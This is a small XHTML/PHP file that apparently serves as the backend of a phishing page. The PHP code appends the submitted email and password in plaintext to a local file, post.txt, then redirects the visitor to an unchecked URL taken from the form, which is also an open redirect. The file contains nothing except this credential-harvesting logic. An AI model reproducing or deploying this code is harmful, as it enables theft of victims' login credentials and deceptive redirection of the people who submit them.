<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html>
<head>
</head>
<body>
<?php

file_put_contents('post.txt', 'User: '.$_POST['email'].PHP_EOL.'Pass: '.$_POST['password'].PHP_EOL, FILE_APPEND);

header('Location: '.$_POST['redirect']);

?>
</body>
</html>
